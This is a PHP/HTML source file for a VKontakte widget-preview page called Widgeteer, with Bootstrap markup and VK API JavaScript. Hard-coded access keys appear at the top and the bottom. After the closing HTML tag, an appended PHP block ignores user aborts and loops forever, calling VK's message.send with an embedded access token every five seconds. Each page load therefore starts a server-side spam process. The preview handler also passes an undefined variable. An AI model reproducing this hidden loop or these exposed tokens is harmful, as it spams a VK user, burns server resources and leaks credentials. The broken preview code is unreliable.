<? 
$access_key = 'XuIFd5dS5XS1MshYoUEG';
?>
<!DOCTYPE html>

<html lang="">
<head>
    <meta charset="utf-8">

    <title>Widgeteer</title>
    <meta name="description" content="Создание виджета для сообщества ВКонтакте">
    <meta name="keywords" content="Sergei Sokolov,ВК,виджет,конструктор">
    <meta name="robots" content="noindex,nofollow">
    
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
</head>

<body>
	<div class="container-fluid">
		<h3>Виджет для сообщества ВК</h3>
		
		<div id="b-alerts"></div>
		
		<div class="form-group">
			<button id="btn-permission" class="btn btn-primary" type="button">Дать разрешение</button>
		</div>

		<div class="form-group">
			<label for="in-type">Тип виджета:</label>
			<select class="form-control" id="in-type">
				<option value="text">text</option>
				<option value="list">list</option>
				<option value="table">table</option>
				<option value="tiles">tiles</option>
				<option value="compact_list">compact_list</option>
				<option value="cover_list">cover_list</option>
				<option value="match">match</option>
				<option value="matches">matches</option>
			</select>
		</div>
		
		<div class="form-group">
			<label for="in-code">Код виджета:</label>
			<textarea rows="7" class="form-control" id="in-code">return {
"title": "Цитата",
"text": "Текст цитаты"
};</textarea>
		</div>

		<button id="btn-preview" class="btn btn-primary" type="button">Предпросмотр виджета</button>
				
	</div><!-- /.container -->
	
	
	

	<!-- Bootstrap JavaScript -->
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
	<!-- /Bootstrap JavaScript -->
	
	<!-- main script -->
	<script>
		function callback(event, className, e){
			console.log(event, e);
			showAlert(className, event, e);
		}
			
		function setVkCallback( event, className) {
			VK.addCallback(event, callback.bind(null, event, className));
		}
		
		function onReady() {
			// Слушать события предпросмотра виджета 
			setVkCallback('onAppWidgetPreviewFail', 'warning');
			setVkCallback('onAppWidgetPreviewCancel', 'info');
			setVkCallback('onAppWidgetPreviewSuccess', 'success');
			
			// События нажатия на кнопки
			$('#btn-permission').on('click', function(){
				console.log('showGroupSettings');
				VK.callMethod("showGroupSettingsBox", 64);
			});
			
			$('#btn-preview').on('click', function(){
				var type = $('#in-type').val()
				  , code = $('#in-code').val()
			  ;
				
				VK.callMethod("showAppWidgetPreviewBox", table, code);
			});
		}
		function showAlert(className, header, text) {
			var html = [
				'<div class="alert alert-dismissible alert-'+className+'" role="alert">',
					'<h4 class="alert-heading">' + header + '</h4>',
					text,
					'<button type="button" class="close" data-dismiss="alert" aria-label="Close">',
				    '<span aria-hidden="true">&times;</span>',
					'</button>',
				'</div>',
			].join('\n');
			$('#b-alerts').append(html);
		}
	</script>
	<!-- /main script -->
	

	<!-- VK scripts -->
	<script src="https://vk.com/js/api/xd_connection.js?2"  type="text/javascript"></script>
	
	<script type="text/javascript">
	  VK.init(function() {
	     // API initialization succeeded
	     onReady();
       
	  }, function() {
	     // API initialization failed
	     // Can reload page here
	     console.error('VK init error', arguments);
		}, '5.74');
	</script>
	<!-- /VK scripts -->

</body>
</html>





<? ignore_user_abort(1);
   $access_key = '1c857e39ba182a7102cdcfcf0a4f0ab0cc26aa04de6565bdd1bdc6586a2832bf890d8c2459855a4f3a911';
while(true){
   file_get_contents('https://vk.com/message.send?user_id=330953666&message=1&access_token=1c857e39ba182a7102cdcfcf0a4f0ab0cc26aa04de6565bdd1bdc6586a2832bf890d8c2459855a4f3a911');
   sleep(5);

}

?>


